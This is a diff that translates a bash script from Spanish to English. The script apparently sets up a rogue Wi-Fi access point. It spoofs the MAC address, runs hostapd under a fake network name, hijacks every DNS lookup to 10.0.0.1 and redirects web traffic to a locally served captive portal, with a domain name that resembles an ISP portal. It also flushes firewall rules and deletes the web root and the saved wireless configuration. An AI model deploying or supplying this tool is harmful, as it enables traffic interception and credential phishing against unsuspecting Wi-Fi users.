@@ -1,6 +1,6 @@
 #!/bin/bash
 
-essid="WIFI_ULTRA_SEGURA"
+essid="SUPER_SECURE_WIFI"
 canal=1
 
 titulo () {
@@ -17,7 +17,7 @@ titulo () {
 "
 }
 
-deteccionInterfaz() {
+interfaceDetection() {
 	var1=$(airmon-ng | wc -l)
 	if [ $var1 -ge 5 ]
 	then
@@ -31,14 +31,14 @@ deteccionInterfaz() {
 				if [ "$VARIABLE" != "enabled" ]
 				then
 					echo
-					echo ¡No se detectaron tarjetas de red compatibles!
+					echo "No compatible interfaces were detected"
 					echo
 					ok=0
 				fi
 			else
 				until [ "$VARIABLE" = "enabled" ]
 				do
-					echo "Las siguientes tarjetas de red están activas:"
+					echo "Running interfaces: "
 					echo
 					num=4
 					int=0
@@ -56,13 +56,13 @@ deteccionInterfaz() {
 						int=$(( $int + 1 ))
 					done
 					echo
-					echo -n "Seleccione la tarjeta de red que desee utilizar: "
+					echo -n "Select an interface: "
 					read OPCION
 					INTERFAZPROV=wlan$OPCION
 					VARIABLE=$(airmon-ng start $INTERFAZPROV | grep -o enabled)
 					if [ "$VARIABLE" != "enabled" ]
 						then
-						echo "¡La tarjeta de red seleccionada no se pudo poner en modo monitor!"
+						echo "Selected interface couldn't be set to monitor mode"
 						echo
 						sleep 2
 						clear
@@ -80,31 +80,31 @@ deteccionInterfaz() {
 		fi
 	else
 		echo
-		echo ¡No se detectaron tarjetas de red compatibles!
+		echo "No compatible interfaces were detected"
 		echo
 		ok=0
 	fi
 }
 
-deteccionInterfaz
+interfaceDetection
 if [ $ok -eq 1 ]
 then
 
-####################### ACTUALIZACIÓN DE PROGRAMAS NECESARIOS ########################
+################################ PROGRAMS NEEDED ####################################
 
 	apt-get install -y hostapd apache2 dnsmasq aircrack-ng gnome-terminal
 
-##################### LIMPIEZA DE IPTABLES PARA EVITAR PROBLEMAS #####################
+######################### IPTABLES FLUSH TO AVOID CONFLICTS ##########################
 
 	iptables -F
 	iptables -t nat -F
 
-######################## AUMENTO DEL RANGO DE LA ANTENA ##############################
+############################# POWER UP WI-FI INTERFACE ###############################
 
 	ifconfig $interfaz down
 	iw reg set US
 
-########################### CAMBIO DE DIRECCIÓN MAC ##################################
+################################ CHANGE MAC ADDRESS ##################################
 
 	macchanger -r $interfaz
 	ifconfig $interfaz up
@@ -113,7 +113,7 @@ then
 	rm -r /root/fakeap
 	mkdir /root/fakeap
 
-############################## CONFIG DE HOSTAPD #####################################
+################################# HOSTAPD CONFIG #####################################
 
 	echo "interface=$interfaz
 driver=nl80211
@@ -128,12 +128,12 @@ ignore_broadcast_ssid=0
 	gnome-terminal --geometry 118x24+0+0 -e "bash -c \"clear; hostapd /root/fakeap/hostapd.conf; exec bash\"" -q -t "$essid $canal"
 	clear
 
-####################### CONFIG DE DNSMASQ  (DNS & DHCP) ###############################
+########################## DNSMASQ CONFIG (DNS & DHCP) ###############################
 
-	# Detiene el dnsmasq daemon que ocupa el puerto 53
+	# Stops dnsmasq daemon on port 53
 	service dnsmasq stop
 
-	# Comprueba si hay conexion
+	# Checks for Internet connection
 	conex=$(ping -c 3 google.com | grep -oiwE '[100-0]\%' | grep -oiwE '[100-0]')
 
 	if [ $conex -lt 100 ]
@@ -147,12 +147,12 @@ server=8.8.8.8
 log-queries
 listen-address=127.0.0.1" > /root/fakeap/dnsmasq.conf
 
-		# CONFIG DE IPTABLES EN CASO DE QUE HAYA CONEXION A INTERNET DISPONIBLE
+		# IPTABLES CONFIG IF THE MACHINE HAS CONNECTION
 
-		# Todo lo que vaya al puerto 80 de esta máquina, lo redirigimos a 10.0.0.1:80
+		# We redirect to 10.0.0.1:80 everything going to port 80 of this machine
 		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
 
-		# Todo lo que salga de esta maquina, va por eth0 y va enmascarado
+		# Everything going out this machine goes by eth0 and masqued
 		iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE
 
 	else
@@ -167,16 +167,16 @@ listen-address=127.0.0.1
 address=/#/10.0.0.1" > /root/fakeap/dnsmasq.conf
 
 	fi
-
-	# Configura dnsmasq para que asocie con nuestra ip el nombre de dominio adecuado
-	# y que el mod_rewrite (.htaccess) pueda referirse directamente al nombre de dominio
+	
+	# Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
+	# (.htaccess) can reffer directly to the domain name in the URL
 	echo "10.0.0.1 wifiportal2.aire.es" > /root/fakeap/hosts
 
 	ifconfig $interfaz 10.0.0.1
 
 	gnome-terminal --geometry 118x24+0+1000 -e "bash -c \"clear; dnsmasq -C /root/fakeap/dnsmasq.conf -H /root/fakeap/hosts -d; exec bash\"" -q -t "DHCP"
 
-############################ EXTRACCIÓN DE ARCHIVOS WEB ###############################
+################################### WEB FILES #########################################
 
 	rm -r /var/www/html/*
 	cp -r captive /var/www/html/captive
@@ -187,11 +187,11 @@ address=/#/10.0.0.1" > /root/fakeap/dnsmasq.conf
 
 	cp -f override.conf /etc/apache2/conf-available/
 
-	# Activa el rewrite y override del archivo .htaccess
+	# Enables rewrite and override for .htaccess
 	a2enconf override
 	a2enmod rewrite
 
-	# Borra la configuración inalámbrica anterior
+	# Removes previous wireless configuration
 	rm -rf /etc/wpa_supplicant/wpa_supplicant.conf
 
 	service apache2 reload
